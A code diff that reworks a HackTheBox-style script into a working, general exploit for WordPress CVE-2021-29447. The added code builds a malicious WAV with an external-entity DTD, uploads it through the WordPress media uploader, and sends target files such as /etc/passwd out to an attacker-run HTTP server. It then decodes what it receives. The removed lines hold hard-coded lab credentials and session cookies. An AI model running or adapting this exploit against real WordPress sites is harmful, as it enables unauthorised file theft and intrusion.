@@ -21,6 +21,18 @@ import sys
 import base64
 import time
 
+import argparse
+import base64
+import os
+import pathlib
+import re
+import requests
+import subprocess
+import sys
+import time
+from urllib.parse import urlparse
+import zlib
+
 
 #### ========= VARIABLE =========
 
@@ -29,149 +41,249 @@ RED = "\033[1;91m"
 YELLOW = "\033[1;93m"
 BLUE = "\033[1;94m"
 GREEN = "\033[1;92m"
-END = "\033[1;m "
+END = "\033[1;m"
 
 ## Set proxy [OPTIONAL]
 proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
 
 #### ========= FUNCTION =========
 
+def argument_parser():
+    """Parse argument provided to the script."""
+    parser = argparse.ArgumentParser(description='WordPress CVE-2021-29447 authenticated exploit')
 
-## Weaponization and Attack
+    parser.add_argument("-l", "--lhost",
+                        required=True,
+                        type=str,
+                        help="Local IP")
 
-def listenPythonServer():
-    print(f"\n{BLUE}[+] LISTEN: {YELLOW}Starting handler on {GREEN}9090 {BLUE}[+]{END}")
-    tn = telnetlib.Telnet()
-    print('\n01')
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    print('\n02')
-    s.bind(("0.0.0.0",9090))
-    print('\n03')
-    s.listen(1)
-    print('\n04')
-    conn, addr = s.accept()
+    parser.add_argument("-lp", "--lport",
+                        required=True,
+                        type=int,
+                        help="Local Port")
 
-    print('\n05')
-    print(f"{BLUE}[+] LISTEN: {YELLOW}Receiving connection from {GREEN}{addr} {BLUE}[+]{END}")
-#   tn.sock = conn
-    print(f"\n{BLUE}[+] SUCCESS: {GREEN}HABEMUS SHELL! {BLUE}[+]{END}\n")
+    parser.add_argument("-t", "--target",
+                        required=True,
+                        type=str,
+                        help="Target WordPress URL, eg: http://XXXX.com")
 
-    print('\n06')
-    try:
-        msg = conn.recv(4048)
-        print(msg)
-    except:
-        s.close()
+    parser.add_argument("-f", "--file",
+                        type=str,
+                        help="File read, eg: /etc/passwd")
+
+    parser.add_argument("-u", "--user",
+                        required=True,
+                        type=str,
+                        help="Username used for WordPress authentication")
+
+    parser.add_argument("-p", "--password",
+                        required=True,
+                        type=str,
+                        help="Password used for WordPress authentication")
+    
+    args = parser.parse_args()
+
+    return args
+
+
+
+
+
+############## Weaponization ##############
+
+############## PYTHON SERVER ##############
+
+"""Start Python WebServer locally on port specified in argument (lhost URL)."""
+def start_python_server(lport):
+    python_server = subprocess.Popen([sys.executable, "-m", "http.server", str(lport)], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+
+    os.set_blocking(python_server.stdout.fileno(), False)
+
+    return python_server
     
 
+"""Stop Python WebServer before exiting script."""  
+def stop_python_server(python_server):
+    python_server.terminate()
+
+    print("Python server stopped")
+
+############## ============== ##############
 
 
 
 
+############## PAYLOADS ##############
 
-# Session HTTP
-r = requests.session()
+def createEvilWAV(lhost, lport):
+    """Generate malicious WAV payload."""
+    payload = b"""RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM 'http://""" + f"{lhost}:{lport}".encode('utf-8') + b"""/malicious.dtd'>%remote;%init;%trick;]>\x00"""
 
-'''Requests HTTP here'''
+    print("Malicous WAV generated" + '\n')
 
-
-def loginAdmin():
-    print(f"\n{BLUE}[+] LOGIN: {YELLOW}Let's login as admin! {BLUE}[+]{END}")
-    url = f"http://metapress.htb/wp-login.php"
-
-    
-    headers = {
-        'Cache-Control': 'max-age=0',
-        'Upgrade-Insecure-Requests': '1',
-        'Origin': 'http://metapress.htb',
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-        'Referer': 'http://metapress.htb/wp-login.php',
-        'Accept-Encoding': 'gzip, deflate',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Connection': 'close'
-        }
-
-    cookies = {
-        'cookie': 'PHPSESSID=vn4lvbrp08q2giu9ltt6qjkmol; wordpress_test_cookie=WP%20Cookie%20check'
-        }
+    return payload
 
 
-    data = {'log':'manager', 'pwd':'partylikearockstar', 'rememberme':'forever', 'wp-submit':'Log+In', 'testcookie':'1'}
-    
-    r.post(url, headers=headers, data=data, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)
+def createEvilDTD(lhost, lport, targetFile):
+    """Generate malicious DTD payload and store it locally."""
+    with open('malicious.dtd', 'w') as file:
+        file.write(f"""<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={targetFile}">\n""")
+        file.write(f"""<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://{lhost}:{lport}/?p=%file;'>" >""")
 
-    print(f"{BLUE}[+] LOGIN: {YELLOW}Logged {GREEN}SUCCESSFULLY! {BLUE}[+]{END}")
+    print("DTD file payload created" + '\n')
 
-    cookies=r.cookies
-    r.get("http://metapress.htb/wp-admin/upload.php", headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)
+############## ======= ##############
 
 
 
-def sendPayload():
 
-    print('UPANDO PAYLOAD!')
+################# Attack #################
 
-    url = f"http://metapress.htb/wp-admin/async-upload.php"
 
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36',
-        'Accept-Encoding': 'gzip, deflate',
-        'Referer': 'http://metapress.htb/wp-admin/upload.php',
-        'Content-Type': 'multipart/form-data; boundary=---------------------------67263521016585108752196551629',
-        'Connection': 'close'
-        }
+def loginWP(rhost, user, password):
+    """Check authenticated connection to WordPress server ."""
 
-    cookies = {
-        'Cookie': 'wordpress_498b28797b9ccef61e19f54e27d9e6f4=manager%7C1673664715%7CvPVReM8AI2R4ST77M0uG6zkWVXHDZfHzOyzMYiHk169%7Ca7a88a601ba2c14a4f2de07b403626fbe76c8a27f0d5413f26dbd88de62c0e1d; wp-settings-time-2=1672371066; wp-settings-2=uploader%3D1%26mfold%3Df; PHPSESSID=145b3hurico7qhbhnt8g35hkun; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_498b28797b9ccef61e19f54e27d9e6f4=manager%7C1673664715%7CvPVReM8AI2R4ST77M0uG6zkWVXHDZfHzOyzMYiHk169%7Cbfe916fded4513f4472966d1fe0d1d02f39afadcc199df1dc404612a8e29bf56'
+    data = {
+      'log': user,
+      'pwd': password,
+      'wp-submit': "Log+In",
+      'redirect_to': rhost + "/wp-admin/",
+      'testcookie': 1
     }
 
-    data = '''-----------------------------67263521016585108752196551629
-Content-Disposition: form-data; name="name"
-
-payload.wav
------------------------------67263521016585108752196551629
-Content-Disposition: form-data; name="action"
-
-upload-attachment
------------------------------67263521016585108752196551629
-Content-Disposition: form-data; name="_wpnonce"
-
-8100393317
------------------------------67263521016585108752196551629
-Content-Disposition: form-data; name="async-upload"; filename="payload.wav"
-Content-Type: audio/x-wav
-
-RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM 'http://10.10.14.7:9090/etern4lw0lf.dtd'>%remote;%init;%trick;]>\x00
------------------------------67263521016585108752196551629--'''
+    r = requests.post(f"{rhost}/wp-login.php", data=data, allow_redirects=True)
 
 
-    r.post(url, headers=headers, data=data, verify=False, cookies=cookies, allow_redirects=False, proxies=proxies)
+    if not r.status_code == 200:
+        print(f"Bad response status : {r.status_code}")
+        print("Exiting ...")
+        exit(1)
+
+    print("Succesfull connection to WordPress server" + '\n')
+
+    return r.cookies
+
+
+
+
+def sendPayload(rhost, cookies, payload):
+    """Retrieve _wpnonce from WordPress."""
+
+    r = requests.get(f'{rhost}/wp-admin/media-new.php', cookies=cookies, proxies=proxies)
+
+    wp_nonce = re.findall(r'name="_wpnonce" value="(\w+)"', r.text)[0]
+
+
+    """Upload payload to WorPress vulnerable media feature."""
+    file_data = {'async-upload': ('malicious.wav', payload)}
+
+    data = {
+        'name': 'malicous.wav',
+        'action': 'upload-attachment',
+        '_wpnonce': wp_nonce
+    }
+
+    r = requests.post(f'{rhost}/wp-admin/async-upload.php', data=data, files=file_data, cookies=cookies)
+
+    if r.status_code == 200:
+        if not r.json()['success']:
+            print("Error during payload upload")
+            print("Exiting ...")
+            exit(1)
+    
+    elif r.status_code == 502:
+        # TODO(investigate sometimes bad gateway response but exploitation ok)
+        pass
+    
+    elif r.status_code == 504:
+        # TODO(investigate sometimes gateway timeout response but exploitation ok for first payload)
+        print(f"Gateway timeout will work only for first payload : {r.status_code}")
+    
+    else:
+        print(f"Bad response status : {r.status_code}\n")
+        print(r.text)
+        print("Exiting ...")
+        exit(1)
+
+
+def retrieve_targeted_file(python_server):
+    """Retrieve information and files from Python WebServer stdout."""
+    payload_printed = False
+    retrieved_file_printed = False
+    printing_error = False
+
+    for line in python_server.stdout.readlines():
+
+        if re.search(r'^Traceback', line):
+            printing_error = True
+
+        if printing_error:
+            print(line)
+            continue
+
+        if re.search(r'GET \/malicious\.dtd', line):
+            if not payload_printed:
+                print("DTD payload retrievied from Python server" + '\n')
+                print(line + '\n')
+                payload_printed = True
+
+        if re.search(r'\/\?p=', line):
+            if not retrieved_file_printed:
+                matched_file = re.search(r'\/\?p=(.+?)\s', line)
+                if matched_file:
+                    file = matched_file.group(1)
+                    print("Retrieved file : "  + '\n')
+                    print(base64.b64decode(file).decode('utf-8'))
+                retrieved_file_printed = True
+
+    if payload_printed and not retrieved_file_printed:
+        print("File not found on server or not permission to read it" + '\n')
+
+    if not payload_printed and not retrieved_file_printed:
+        print("Error WAV payload not executed on WordPress")
+
+    if printing_error:
+        print("Exiting ...")
+        exit(1)
+
+
+
+
+def clean_temporary_files():
+    """Remove temporary file used by script (DTD payload)."""
+    os.remove('malicious.dtd')
+
+
 
 
 def main():
-    # Parse Arguments
-    parser = argparse.ArgumentParser(description='HackTheBox TEMPLATE AutoShell - 0xEtern4lW0lf')
-    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
-    parser.add_argument('-li', '--localip', help='Local ip address or hostname', required=True)
-    parser.add_argument('-lp', '--localport', help='Local port to receive the shell', required=True)
 
-    args = parser.parse_args()
-
+    args = argument_parser()
+    lhost = args.lhost
+    lport = args.lport
     rhost = args.target
-    lhost = args.localip
-    lport = args.localport
+    user = args.user
+    password = args.password
+    targetFile = args.file
+
+    cookies = loginWP(rhost, user, password)
+ 
+    python_server = start_python_server(lport)
+
+    payload = createEvilWAV(lhost, lport)
+
+    createEvilDTD(lhost, lport, targetFile)
     
+    sendPayload(rhost, cookies, payload)
+    
+    time.sleep(2)
 
-#    thr = Thread(target=listenPythonServer)
-#    thr.start()
+    retrieve_targeted_file(python_server)
+
+    stop_python_server(python_server)
 
 
-    loginAdmin()
-
-    sendPayload()
-
+    clean_temporary_files()
 
 #### EXECUTION
 
